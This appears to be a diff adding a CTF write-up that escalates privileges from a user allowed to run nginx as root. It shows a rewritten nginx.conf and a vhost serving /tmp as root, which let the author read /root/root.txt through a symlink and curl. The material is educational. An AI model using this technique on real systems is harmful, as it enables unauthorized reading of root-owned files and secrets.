@@ -1,0 +1,120 @@
+# A fun privesc
+
+---
+
+In a recent CTF, I had access to a user that could run `nginx` as root with no password.
+
+There are no entries on [gtfobins](https://gtfobins.github.io/) for this, so it was a think out of the box privesc. (The best kind imo)
+
+It was pretty easy to get the root **flag** but actually getting RCE as root was a bit trickier...
+
+## Getting the flag
+
+Because we can run `nginx` as root, we can specify our own config files, to control what nginx does. 
+
+I copied the original nginx.conf file to /tmp/nginx.conf and made some changes.
+
+
+```bash
+user root; #<--------------------------- CHANGE 1
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
+
+events {
+        worker_connections 768;
+        # multi_accept on;
+}
+
+http {
+
+        ##
+        # Basic Settings
+        ##
+
+        sendfile on;
+        tcp_nopush on;
+        types_hash_max_size 2048;
+        # server_tokens off;
+
+        # server_names_hash_bucket_size 64;
+        # server_name_in_redirect off;
+
+        include /etc/nginx/mime.types;
+        default_type application/octet-stream;
+
+        ##
+        # SSL Settings
+        ##
+
+        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
+        ssl_prefer_server_ciphers on;
+
+        ##
+        # Logging Settings
+        ##
+
+        access_log /var/log/nginx/access.log;
+        error_log /var/log/nginx/error.log;
+
+        ##
+        # Gzip Settings
+        ##
+
+        gzip on;
+
+        # gzip_vary on;
+        # gzip_proxied any;
+        # gzip_comp_level 6;
+        # gzip_buffers 16 8k;
+        # gzip_http_version 1.1;
+        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
+
+        ##
+        # Virtual Host Configs
+        ##
+
+        include /etc/nginx/conf.d/*.conf;
+        include /tmp/sites-enabled/*; #<-----------------------------CHANGE 2
+}
+```
+So now I can get `nginx` running as root, and it will use my `/tmp/sites-enabled/` directory for the virtual hosts.
+
+I'll then create a custom `nginx` vhosts file in `/tmp/sites-enabled/default` with the following.
+
+```
+server {
+        #----- MODIFIED TO LISTEN ON RANDOM PORT ---------
+        listen 8999 default_server;
+        listen [::]:8999 default_server;
+
+        #----- MODIFIED TO ATTACKER CONTROLLED DIRECTORY ------
+        root /tmp/;
+
+        # Add index.php to the list if you are using PHP
+        index index.html index.htm index.nginx-debian.html;
+
+        server_name _;
+
+        location / {
+                # First attempt to serve request as file, then
+                # as directory, then fall back to displaying a 404.
+                try_files $uri $uri/ =404;
+        }
+
+}
+```
+
+Now because `nginx` runs this site as `root`, it can read any file that root can.
+
+
+If I create a symlink in /tmp/root.txt --> /root/root.txt, start `nginx`, and run curl localhost:8999/root.txt, it should output the flag!
+
+
+
+
+
+
+
+
+
